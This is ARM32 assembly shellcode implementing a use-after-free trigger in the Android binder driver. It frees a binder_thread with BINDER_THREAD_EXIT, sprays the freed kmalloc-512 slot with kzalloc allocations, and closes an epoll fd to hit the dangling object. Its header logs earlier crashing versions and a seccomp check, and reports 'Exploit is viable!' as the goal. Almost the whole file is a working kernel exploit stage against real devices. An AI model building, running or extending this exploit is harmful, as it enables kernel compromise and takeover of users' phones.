/*
 * uaf_trigger_test_c.s — UAF trigger with binder kzalloc spray
 * ARM32 EABI shellcode
 *
 * v17 crashed: close(epoll_fd) on freed binder_thread → spinlock deadlock
 *   (freed slab reused by random allocation, non-zero at WAITQUEUE_OFFSET)
 * v17b confirmed: BINDER_THREAD_EXIT is SECCOMP-allowed (0xBB00)
 *
 * Fix: After BINDER_THREAD_EXIT frees the binder_thread (kmalloc-512),
 * spray the freed slot with zeroed data by opening new /dev/binder fds
 * and calling ioctl. Each ioctl triggers binder_get_thread → kzalloc(408)
 * → kmalloc-512. kzalloc zeros the memory, so spinlock at WAITQUEUE_OFFSET
 * (0xA0) is 0 = unlocked. close(epoll_fd) can then acquire spinlock safely.
 *
 * Sequence:
 *   A1-A5: Binder + epoll + BC_ENTER_LOOPER (confirmed v15)
 *   B1: BINDER_THREAD_EXIT — FREE binder_thread (kmalloc-512)
 *   B2: Spray loop — open 4 new /dev/binder, ioctl each → 4× kzalloc
 *   B3: close(epoll_fd) — UAF trigger (spinlock should be 0 now)
 *   B4: cleanup + return
 *
 * Expected:
 *   0xBB00 = UAF SURVIVED with spray! Exploit is viable!
 *   0xA1-A5 = setup failed
 *   0xB200 = spray openat failed (all 4 attempts)
 *   Device reboot = still crashing (need more spray / different approach)
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ BINDER_SET_MAX_THREADS, 0x40046205
.equ BINDER_WRITE_READ,      0xc0186201
.equ BINDER_THREAD_EXIT,     0x40046208
.equ BC_ENTER_LOOPER,        0x0000000D
.equ EPOLL_CTL_ADD,          1
.equ EPOLLIN,                0x001
.equ O_RDWR,                 2

/* Stack layout (80 bytes = 0x50):
 * SP+0x00: max_threads (4)
 * SP+0x04: BWR struct (24 bytes, SP+0x04 to SP+0x1B)
 * SP+0x1C: BC_ENTER_LOOPER cmd (4)
 * SP+0x20: epoll_event (12)
 * SP+0x2C: timespec (8)
 * SP+0x34: spray_count scratch (4)
 * SP+0x38: padding
 */
.equ FRAME, 80

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME

    /* ═══ PHASE A: Binder + epoll + BC_ENTER_LOOPER setup ═══ */

    /* A1: openat("/dev/binder", O_RDWR) */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* A2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) */
    mov     r0, r4
    ldr     r1, const_smt
    mov     r3, #0
    str     r3, [sp, #0]
    add     r2, sp, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a2

    /* A3: epoll_create1(0) */
    mov     r0, #0
    mov     r7, #352
    add     r7, r7, #5          /* 357 = __NR_epoll_create1 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a3
    mov     r8, r0              /* R8 = epoll_fd */

    /* A4: epoll_ctl(epoll_fd, ADD, binder_fd, {EPOLLIN}) */
    mov     r3, #EPOLLIN
    str     r3, [sp, #0x20]
    str     r4, [sp, #0x24]
    mov     r3, #0
    str     r3, [sp, #0x28]
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    mov     r2, r4
    add     r3, sp, #0x20
    mov     r7, #248
    add     r7, r7, #3          /* 251 = __NR_epoll_ctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a4

    /* A5: ioctl(binder_fd, BINDER_WRITE_READ, BC_ENTER_LOOPER) */
    mov     r3, #BC_ENTER_LOOPER
    str     r3, [sp, #0x1C]
    mov     r3, #4
    str     r3, [sp, #0x04]     /* write_size */
    mov     r3, #0
    str     r3, [sp, #0x08]     /* write_consumed */
    add     r3, sp, #0x1C
    str     r3, [sp, #0x0C]     /* write_buffer */
    mov     r3, #0
    str     r3, [sp, #0x10]     /* read_size */
    str     r3, [sp, #0x14]     /* read_consumed */
    str     r3, [sp, #0x18]     /* read_buffer */
    mov     r0, r4
    ldr     r1, const_bwr
    add     r2, sp, #0x04
    mov     r7, #54
    svc     #0
    cmp     r0, #0
    bmi     fail_a5

    /* ═══ PHASE B: UAF with kzalloc spray ═══ */

    /* B1: BINDER_THREAD_EXIT — FREE binder_thread (kmalloc-512) */
    mov     r0, r4
    ldr     r1, const_bte
    mov     r2, #0
    mov     r7, #54
    svc     #0
    /* binder_thread is now on kmalloc-512 freelist */

    /* B2: Spray — open new /dev/binder fds + ioctl each.
     * Each ioctl calls binder_get_thread → kzalloc(sizeof(binder_thread))
     * → kmalloc-512 allocation. kzalloc zeros the memory, so the
     * spinlock at WAITQUEUE_OFFSET (0xA0) is 0 (unlocked).
     * We do 4 iterations for reliability (different CPUs may grab slots). */
    mov     r9, #4              /* spray count */
spray_loop:
    mvn     r0, #99             /* AT_FDCWD */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* openat */
    svc     #0
    cmp     r0, #0
    bmi     spray_next          /* skip if open failed */
    mov     r11, r0             /* spray_fd (leaked — fine for test) */

    /* ioctl → binder_get_thread → kzalloc → spray! */
    mov     r0, r11
    ldr     r1, const_smt       /* BINDER_SET_MAX_THREADS */
    mov     r3, #0
    str     r3, [sp, #0]
    add     r2, sp, #0
    mov     r7, #54
    svc     #0
    /* Don't check return — kzalloc already happened in binder_get_thread */
spray_next:
    subs    r9, r9, #1
    bgt     spray_loop

    /* B3: close(epoll_fd) — TRIGGER UAF!
     * The freed binder_thread slot should now contain zeroed data
     * from our kzalloc spray. The spinlock at WAITQUEUE_OFFSET is 0.
     * spin_lock_irqsave → succeeds immediately.
     * list_del writes self-pointing pointers → harmless. */
    mov     r0, r8              /* epoll_fd */
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* B4: nanosleep(50ms) — let kernel settle */
    mov     r3, #0
    str     r3, [sp, #0x2C]     /* tv_sec = 0 */
    ldr     r3, const_50ms
    str     r3, [sp, #0x30]     /* tv_nsec */
    add     r0, sp, #0x2C
    mov     r1, #0
    mov     r7, #162            /* __NR_nanosleep */
    svc     #0

    /* Cleanup: close binder_fd (spray fds are leaked — harmless) */
    mov     r0, r4
    mov     r7, #6
    svc     #0

    /* ═══ SURVIVED! UAF trigger with spray works! ═══ */
    mov     r0, #0xBB00
    b       done

    /* ── Error handlers ── */
fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a2:
    rsb     r0, r0, #0
    mov     r1, #0xA200
    orr     r0, r0, r1
    b       done
fail_a3:
    rsb     r0, r0, #0
    ldr     r1, const_err_a3
    orr     r0, r0, r1
    b       done
fail_a4:
    rsb     r0, r0, #0
    ldr     r1, const_err_a4
    orr     r0, r0, r1
    b       done
fail_a5:
    rsb     r0, r0, #0
    ldr     r1, const_err_a5
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ── Data pool ── */
    .align 2
const_smt:
    .word   0x40046205          /* BINDER_SET_MAX_THREADS */
const_bwr:
    .word   0xc0186201          /* BINDER_WRITE_READ */
const_bte:
    .word   0x40046208          /* BINDER_THREAD_EXIT */
const_50ms:
    .word   50000000
const_err_a3:
    .word   0xA300
const_err_a4:
    .word   0xA400
const_err_a5:
    .word   0xA500
str_binder:
    .asciz  "/dev/binder"
    .align  2
